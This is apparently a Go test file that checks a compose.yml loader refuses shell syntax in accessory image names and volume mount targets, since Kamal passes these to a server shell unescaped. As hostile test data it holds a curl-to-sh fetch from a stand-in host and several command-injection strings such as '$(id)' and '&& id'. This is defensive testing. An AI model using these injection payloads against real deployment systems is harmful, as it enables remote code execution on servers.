package project

import (
	"strings"
	"testing"
)

// Kamal puts an accessory's image, and every volume's name and target, on
// a docker command line that runs through the server's shell, unescaped
// (docs/plans/compose-shell-values.md). So a compose.yml pushed to a linked
// repo must not be able to put shell syntax there: Load refuses it, with
// the field's path, before anything reaches Kamal.

const hostileImage = "redis:7;curl -s https://example.invalid/p|sh"

func TestImageRefusesShellSyntax(t *testing.T) {
	for _, image := range []string{
		hostileImage,
		"redis:7 && id",
		"redis$(id)",
		"redis`id`",
		"redis|sh",
		"redis>/tmp/x",
		"-oops",
		"redis 7",
		"redis:7\nid",
		"Redis",
	} {
		t.Run(image, func(t *testing.T) {
			svc := "  cache:\n    image: " + yamlQuote(image) + "\n"
			ps := loadProblems(t, writeCompose(t, doc{services: svc}.String()))
			assertProblem(t, ps, "services.cache.image", "image name")
		})
	}
}

func TestImageAcceptsRealReferences(t *testing.T) {
	for _, image := range []string{
		"redis",
		"redis:7",
		"postgres:16-alpine",
		"library/redis:7.2.4",
		"ghcr.io/owner/tool:1.2",
		"registry.example.com:5000/team/app_x-y:v1.0",
		"localhost:5000/svc",
		"redis@sha256:" + strings.Repeat("a", 64),
		"docker.io/library/redis:7@sha256:" + strings.Repeat("0", 64),
	} {
		t.Run(image, func(t *testing.T) {
			mustLoad(t, writeCompose(t, doc{services: "  cache:\n    image: " + yamlQuote(image) + "\n"}.String()))
		})
	}
}

// longVolume is a long-syntax named volume, which can carry any target.
func longVolume(source, target string) string {
	return "    volumes:\n      - type: volume\n        source: " + yamlQuote(source) + "\n        target: " + yamlQuote(target) + "\n"
}

func TestVolumeTargetRefusesShellSyntax(t *testing.T) {
	for _, target := range []string{
		"/data;id",
		"/data $(id)",
		"/da`id`ta",
		"/data|sh",
		"/data&&id",
		"/data\nid",
		"/data'x",
		"/data\"x",
		"relative/path",
	} {
		t.Run(target, func(t *testing.T) {
			top := "volumes:\n  data: {}\n"
			t.Run("app", func(t *testing.T) {
				ps := loadProblems(t, writeCompose(t, doc{app: longVolume("data", target), top: top}.String()))
				assertProblem(t, ps, "services.app.volumes", "mount path")
			})
			t.Run("accessory", func(t *testing.T) {
				svc := "  db:\n    image: postgres:16\n" + longVolume("data", target)
				ps := loadProblems(t, writeCompose(t, doc{services: svc, top: top}.String()))
				assertProblem(t, ps, "services.db.volumes", "mount path")
			})
		})
	}
}

func TestVolumeTargetAcceptsPaths(t *testing.T) {
	for _, target := range []string{"/data", "/var/lib/postgresql/data", "/app/storage.v2", "/srv/my-app_files/@cache", "/"} {
		t.Run(target, func(t *testing.T) {
			top := "volumes:\n  data: {}\n"
			svc := "  db:\n    image: postgres:16\n" + longVolume("data", target)
			mustLoad(t, writeCompose(t, doc{services: svc, top: top}.String()))
		})
	}
}

// yamlQuote is s as a double-quoted YAML scalar.
func yamlQuote(s string) string {
	r := strings.NewReplacer(`\`, `\\`, `"`, `\"`, "\n", `\n`)
	return `"` + r.Replace(s) + `"`
}

// A variable in an image is resolved, or refused, when the Kamal config is
// made; here it stands in for a plain tag, and shell syntax beside it or in
// its default still fails.
func TestImageVariables(t *testing.T) {
	for _, image := range []string{"redis:${TAG}", "redis:${TAG:-7}", "redis:$TAG", "${REGISTRY}/tool:1"} {
		t.Run("loads "+image, func(t *testing.T) {
			mustLoad(t, writeCompose(t, doc{services: "  cache:\n    image: " + yamlQuote(image) + "\n"}.String()))
		})
	}
	for _, image := range []string{"redis:${TAG}$(id)", "redis:${TAG:-7;id}", "redis:${TAG:-$(id)}", "redis:${TAG}`id`", "${X};id"} {
		t.Run("refuses "+image, func(t *testing.T) {
			ps := loadProblems(t, writeCompose(t, doc{services: "  cache:\n    image: " + yamlQuote(image) + "\n"}.String()))
			assertProblem(t, ps, "services.cache.image", "image name")
		})
	}
}
